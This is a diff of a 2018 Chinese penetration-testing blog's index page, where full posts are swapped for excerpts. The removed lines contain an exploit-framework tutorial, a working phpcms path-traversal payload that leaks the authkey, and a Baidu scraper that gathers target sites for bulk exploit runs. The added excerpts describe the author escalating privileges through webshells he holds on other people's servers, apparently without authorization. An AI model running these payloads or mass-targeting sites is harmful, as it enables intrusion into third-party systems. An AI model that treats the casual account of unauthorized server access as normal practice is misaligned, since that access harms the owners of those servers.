@@ -143,6 +143,103 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CmsExploit_framework编写（二）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/12/CmsExploit_framework编写（二）/">CmsExploit_framework编写（二）</a>
+    </h1>
+  
+
+        
+        <a href="/2018/11/12/CmsExploit_framework编写（二）/" class="archive-article-date">
+  	<time datetime="2018-11-12T03:12:42.271Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-12</time>
+</a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">1.4k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">6分</span>
+      </span>
+    </span>
+</div>
+          
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇中已经成功实现了对单个url的扫描，这篇讲解多线程实现批量url扫描。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>重写多线程类，根据用户输入参数选择是否执行多线程方法。使用event事件解决线程锁问题。<br>
+        
+          <a class="article-more-a" href="/2018/11/12/CmsExploit_framework编写（二）/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/11/12/CmsExploit_framework编写（二）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CmsExploit_framework编写（一）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -158,27 +255,35 @@
         <a href="/2018/11/11/CmsExploit_framework编写（一）/" class="archive-article-date">
   	<time datetime="2018-11-11T09:17:39.378Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-11</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">1.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">6分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上follow了不少大佬，每天看他们star fork，有很多的优秀项目，感觉自己开发能力还是太菜了，打算跟随大佬们的脚步造造轮子。这次写的是CMS利用框架，本文先讲解第一部分，完成对单个url的扫描。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我们选用上一篇博客里给大家推荐的ske师傅的项目，总体框架见下图。<img src="https://raw.githubusercontent.com/SkewwG/CmsExp/master/CmsExp.png" alt=""><br>主文件为scan.py,功能实现主要为Libs/func.py。程序执行的流程为根据传入的参数，先把EXP目录下的文件夹列出来在转到指定CMS路径下，然后在执行exp。</p>
-<h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>先定义我们需要传入的参数，这里先把它写死吧方便调试。<br><em>scan.py</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">from Libs.func import *</span><br><span class="line"></span><br><span class="line">init = ExpFunction()</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">def cmdParser(url,cms,t):</span><br><span class="line">    ExpFolders = init.CmsFolderList()</span><br><span class="line">    scan(url,cms)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#对单个url扫描指定cms的所有exp</span><br><span class="line">def scan(url,cms,t=1):</span><br><span class="line">    init.setSyspath(cms)</span><br><span class="line">    Expscript = init.ExpCmsList(cms)</span><br><span class="line">    print(&apos;*t&#123;&#125; scan url &#123;&#125;&apos;.format(t,url))</span><br><span class="line">    for exp in Expscript:</span><br><span class="line">        print(&apos;[*t&#123;&#125;] Load Exp &#123;&#125;&apos;.format(t,exp))</span><br><span class="line">        init.ExcuteExp(url,exp[:-3])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(&apos;&apos;&apos;</span><br><span class="line"> _    _ _ _    ___                                           _       _ _   </span><br><span class="line">| |  | (_) |  / _ \                                         | |     (_) |  </span><br><span class="line">| |__| |_| |_| | | |_ __   ___ _ __ ___  ___  _____  ___ __ | | ___  _| |_ </span><br><span class="line">|  __  | | __| | | | &apos;_ \ / __| &apos;_ ` _ \/ __|/ _ \ \/ / &apos;_ \| |/ _ \| | __|</span><br><span class="line">| |  | | | |_| |_| | | | | (__| | | | | \__ \  __/&gt;  &lt;| |_) | | (_) | | |_ </span><br><span class="line">|_|  |_|_|\__|\___/|_| |_|\___|_| |_| |_|___/\___/_/\_\ .__/|_|\___/|_|\__|</span><br><span class="line">                                                      | |                  </span><br><span class="line">                                                      |_|     </span><br><span class="line"> &apos;&apos;&apos;)</span><br><span class="line">   </span><br><span class="line">    url = &apos;https://www.xxx.com&apos;</span><br><span class="line">    cms = &apos;phpcms&apos;</span><br><span class="line">    t = 5</span><br><span class="line">    cmdParser(url,cms,t)</span><br></pre></td></tr></table></figure></p>
-<p><em>func.py</em></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class ExpFunction():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.path = os.getcwd() + &apos;/EXP/&apos;#获取当前，跳到exp目录下</span><br><span class="line"></span><br><span class="line">    #列出所有cms文件夹</span><br><span class="line">    def CmsFolderList(self):</span><br><span class="line">        Folderlist = filter(lambda x :(True,False)[x[-3:] == &apos;.py&apos;],os.listdir(self.path))</span><br><span class="line">        return Folderlist</span><br><span class="line"></span><br><span class="line">    #列出指定cms的所有exp</span><br><span class="line">    def ExpCmsList(self,cms):</span><br><span class="line">        Cmslist = filter(lambda x : (True,False)[x[-3:] == &apos;pyc&apos; or x[:2] == &apos;__&apos;],os.listdir(self.path + cms))</span><br><span class="line">        return Cmslist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #执行exp</span><br><span class="line">    def ExcuteExp(self,url,expname):</span><br><span class="line">        md = __import__(expname)</span><br><span class="line">        try:</span><br><span class="line">            if hasattr(md,&apos;Exploit&apos;):    #判断md是否有Explpit类</span><br><span class="line">                exp = getattr(md,&apos;Exploit&apos;)()   #实例化Exploit</span><br><span class="line">                ret = exp.attack(url)</span><br><span class="line">                if ret:</span><br><span class="line">                    print(&apos;[Success] : &#123;&#125;&apos;.format(ret))</span><br><span class="line">                    with open(&apos;&#123;&#125;/ret/ret.txt&apos;.format(os.getcwd()),&apos;at&apos;) as f:</span><br><span class="line">                        result = &apos;%-30s  %s\n&apos; %(url,expname)</span><br><span class="line">                        f.writelines(result)</span><br><span class="line"></span><br><span class="line">                else:</span><br><span class="line">                    print(&apos;Fail&apos;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line">    def setSyspath(self,cms):</span><br><span class="line">        sys.path.append(self.path + cms)</span><br></pre></td></tr></table></figure>
-<p>运行scan.py会先执行cmdParser<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">init = ExpFunction()</span><br><span class="line">def cmdParser(url,cms,t):</span><br><span class="line">    ExpFolders = init.CmsFolderList()</span><br><span class="line">    scan(url,cms)</span><br></pre></td></tr></table></figure></p>
-<p>跟进CmsFolderList()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class ExpFunction():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.path = os.getcwd() + &apos;/EXP/&apos;#获取当前，跳到exp目录下</span><br><span class="line"></span><br><span class="line">    #列出所有cms文件夹</span><br><span class="line">    def CmsFolderList(self):</span><br><span class="line">        Folderlist = filter(lambda x :(True,False)[x[-3:] == &apos;.py&apos;],os.listdir(self.path))</span><br><span class="line">        return Folderlist</span><br></pre></td></tr></table></figure></p>
-<p>这里实现的功能是列出所有的cms文件夹，首先获取当前路径然后跳到EXP文件夹下。可能这里会有一个疑问os.getcwd()获取的是当前路径，因为执行的是scan.py所以获取到的路径是scan.py的路径。<br><img src="https://i.imgur.com/0EwiSrE.png" alt=""><br>接下来要知道filter（）和lambda是怎么用的，谷歌即可不再赘述。代码的主要意思是：把EXP目录下的所有文件列出来作为参数传给lambda的x,用切片判断x的后三位是否为.py,是的话就为1对应的就是False就会被filter给过滤掉最后返回给Folderlist，获得所有的cms文件名。</p>
-<p>下一步执行scan函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def scan(url,cms,t=1):</span><br><span class="line">    init.setSyspath(cms)</span><br><span class="line">    Expscript = init.ExpCmsList(cms)</span><br><span class="line">    print(&apos;*t&#123;&#125; scan url &#123;&#125;&apos;.format(t,url))</span><br><span class="line">    for exp in Expscript:</span><br><span class="line">        print(&apos;[*t&#123;&#125;] Load Exp &#123;&#125;&apos;.format(t,exp))</span><br><span class="line">        init.ExcuteExp(url,exp[:-3])</span><br></pre></td></tr></table></figure></p>
-<p>代码也比较容易理解，跟进ExpCmsList,和上面差不多的，获取所有exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#列出指定cms的所有exp</span><br><span class="line"> def ExpCmsList(self,cms):</span><br><span class="line">     Cmslist = filter(lambda x : (True,False)[x[-3:] == &apos;pyc&apos; or x[:2] == &apos;__&apos;],os.listdir(self.path + cms))</span><br><span class="line">     return Cmslist</span><br></pre></td></tr></table></figure></p>
-<p>跟进ExcuteExp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def ExcuteExp(self,url,expname):</span><br><span class="line">    md = __import__(expname)</span><br><span class="line">    try:</span><br><span class="line">        if hasattr(md,&apos;Exploit&apos;):    #判断md是否有Explpit类</span><br><span class="line">            exp = getattr(md,&apos;Exploit&apos;)()   #实例化Exploit</span><br><span class="line">            ret = exp.attack(url)</span><br><span class="line">            if ret:</span><br><span class="line">                print(&apos;[Success] : &#123;&#125;&apos;.format(ret))</span><br><span class="line">                with open(&apos;&#123;&#125;/ret/ret.txt&apos;.format(os.getcwd()),&apos;at&apos;) as f:</span><br><span class="line">                    result = &apos;%-30s  %s\n&apos; %(url,expname)</span><br><span class="line">                    f.writelines(result)</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&apos;Fail&apos;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">def setSyspath(self,cms):</span><br><span class="line">    sys.path.append(self.path + cms)</span><br></pre></td></tr></table></figure>
-<p><strong>import</strong>是动态导入，因为是跨目录的，所以必须把当前路径添加到系统环境变量里否则会导入不成功。先看一个exp的格式,如下。上面的代码大概意思是判断导入的exp是否有Exploit类，有的话就实例化然后在执行attack方法。然后根据exp的返回值判断是否存在这个漏洞，存在的话就打开ret/ret.txt把url和expname写进去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">class Exploit:</span><br><span class="line"></span><br><span class="line">    def attack(self, url):</span><br><span class="line">        payload = &quot;/api.php?op=get_menu&amp;act=ajax_getlist&amp;callback=loidaa&amp;parentid=0&amp;key=authkey&amp;cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\\applist&amp;path=admin&quot;</span><br><span class="line">        response = requests.get(url+payload)</span><br><span class="line">        regx = re.search(r&apos;loidaa\(\[&quot;,(\S+),,,&quot;\]\)&apos;,response.text)</span><br><span class="line">        if response.status_code == 200 and regx and len(response.content) &lt; 200:</span><br><span class="line">            return &quot;&#123;&#125; ==&gt; &#123;&#125;&quot;.format(url, regx.group(1)) if regx.group(1) != &apos;&apos; else None</span><br></pre></td></tr></table></figure></p>
-<p>OK，到这里就完成了单个url的扫描。<br>看下效果吧。<br><img src="https://i.imgur.com/4eJ2m7B.png" alt=""></p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>整个流程差不多就是这样了，篇二写多线程以及批量验证。可自行添加exp，按照格式来就行了。</p>
-
+        
+          <a class="article-more-a" href="/2018/11/11/CmsExploit_framework编写（一）/#more">more >></a>
+        
       
 
       
@@ -186,11 +291,122 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/11/11/CmsExploit_framework编写（一）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-记一次曲折的Linux提权" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/07/记一次曲折的Linux提权/">记一次曲折的Linux提权</a>
+    </h1>
+  
+
+        
+        <a href="/2018/11/07/记一次曲折的Linux提权/" class="archive-article-date">
+  	<time datetime="2018-11-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-07</time>
+</a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">1.1k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">4分</span>
+      </span>
+    </span>
+</div>
+          
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="本文首发于合天智汇"><a href="#本文首发于合天智汇" class="headerlink" title="本文首发于合天智汇"></a>本文首发于合天智汇</h3><h2 id="0X01-前言"><a href="#0X01-前言" class="headerlink" title="0X01 前言"></a>0X01 前言</h2><p>最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。</p>
+        
+          <a class="article-more-a" href="/2018/11/07/记一次曲折的Linux提权/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">实战</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/11/07/记一次曲折的Linux提权/">展开全文 >></a>
         </p>
       
 
@@ -235,22 +451,35 @@
         <a href="/2018/10/28/python url采集 + exp批量测试/" class="archive-article-date">
   	<time datetime="2018-10-28T15:19:27.430Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-28</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">532字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">2分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="严正声明-本文仅用于技术探讨-严禁用作其他用途。"><a href="#严正声明-本文仅用于技术探讨-严禁用作其他用途。" class="headerlink" title="严正声明:本文仅用于技术探讨,严禁用作其他用途。"></a>严正声明:本文仅用于技术探讨,严禁用作其他用途。</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早就有想法写一个自己的漏洞利用框架了，主要思路是利用搜索引擎采集特征url，然后在调用exp进行批量验证。</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="url采集"><a href="#url采集" class="headerlink" title="url采集"></a>url采集</h3><p>不详细写了，网上已经有很多类似的文章了，直接贴代码出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">from bs4 import BeautifulSoup as bs</span><br><span class="line">from threading import Thread</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">headers = &#123;&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0&apos;&#125;</span><br><span class="line"></span><br><span class="line">class Baiduspider(Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self._queue = queue</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while not self._queue.empty():</span><br><span class="line">                url = self._queue.get()</span><br><span class="line">                try:</span><br><span class="line">                    self.spider(url)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">    def spider(self,url):</span><br><span class="line">        r = requests.get(url=url, headers=headers)</span><br><span class="line">        soup = bs(r.content,&apos;lxml&apos;)</span><br><span class="line">        urls = soup.find_all(name=&apos;a&apos;,attrs=&#123;&apos;data-click&apos;:re.compile((&apos;.&apos;)),&apos;class&apos;:None&#125;)</span><br><span class="line">        for url in urls:</span><br><span class="line">            #print (type(url))</span><br><span class="line">            try:</span><br><span class="line">                r = requests.get(url[&apos;href&apos;],headers=headers,timeout = 4)</span><br><span class="line">                if r.status_code == 200:</span><br><span class="line">                    r_para = r.url</span><br><span class="line">                    r_split = r_para.split(&apos;/&apos;)</span><br><span class="line">                    url = r_split[0] + &apos;//&apos; + r_split[2]</span><br><span class="line">                    with open(&apos;result.txt&apos;) as f:</span><br><span class="line">                        if url not in f.read():</span><br><span class="line">                            print(url)</span><br><span class="line">                            f1 = open(&apos;result.txt&apos;,&apos;a+&apos;)</span><br><span class="line">                            f1.writelines(url+&apos;\n&apos;)</span><br><span class="line">                            f1.close()</span><br><span class="line">            except Exception as e:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    queue = Queue()</span><br><span class="line">    for i in range(0,750,10):</span><br><span class="line">        queue.put(&apos;https://www.baidu.com/s?wd=&#123;&#125;&amp;pn=&#123;&#125;&apos;.format(keyword,i))</span><br><span class="line">        threads = []</span><br><span class="line">        thread_count = 10</span><br><span class="line">        for i in range(thread_count):</span><br><span class="line">            t = Baiduspider(queue)</span><br><span class="line">            threads.append(t)</span><br><span class="line">        #for t in threads:</span><br><span class="line">            t.start()</span><br><span class="line">        for t in threads:</span><br><span class="line">            t.join</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    f1 = open(&apos;result.txt&apos;,&apos;w&apos;)</span><br><span class="line">    f1.close()</span><br><span class="line">    keyword = input(&apos;请输入关键字: &apos;)</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>网上有很多，多去github上搜搜，由于具有一定的危害性就不放出来了，这里推荐ske师傅的一个项目。<br><a href="https://github.com/SkewwG/CmsExp" title="CmsExp" target="_blank" rel="noopener">https://github.com/SkewwG/CmsExp</a></p>
-<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>运行url采集脚本，如图。</p>
-<p><img src="https://i.imgur.com/poZ3QmJ.png" alt=""></p>
-<p>运行exp验证脚本，这里以aspcms为例。</p>
-<p><img src="https://i.imgur.com/RbrPIsd.png" alt=""></p>
-<p>随便挑一个去解密。</p>
-<p><img src="https://i.imgur.com/iP4h9DC.png" alt=""></p>
-<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>url采集器还是很重要的，每爆出一个新的漏洞，你只要提取出特征值就可以精确寻找目标。当然搜索引擎也不止只有百度，还有一些网络空间搜索引擎比如：FOFA,ZoomEye,Shodan.都可以了解一下，利用相应的api来采集。</p>
-
+        <h2 id="严正声明-本文仅用于技术探讨-严禁用作其他用途。"><a href="#严正声明-本文仅用于技术探讨-严禁用作其他用途。" class="headerlink" title="严正声明:本文仅用于技术探讨,严禁用作其他用途。"></a>严正声明:本文仅用于技术探讨,严禁用作其他用途。</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早就有想法写一个自己的漏洞利用框架了，主要思路是利用搜索引擎采集特征url，然后在调用exp进行批量验证。<br>
+        
+          <a class="article-more-a" href="/2018/10/28/python url采集 + exp批量测试/#more">more >></a>
+        
       
 
       
@@ -258,6 +487,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -307,15 +547,35 @@
         <a href="/2018/10/26/从SQL注入到内网漫t/" class="archive-article-date">
   	<time datetime="2018-10-26T03:11:53.777Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-26</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">834字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">2分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在一次渗透实战中，发现了一个注入点，最后成功的漫游了内网。</p>
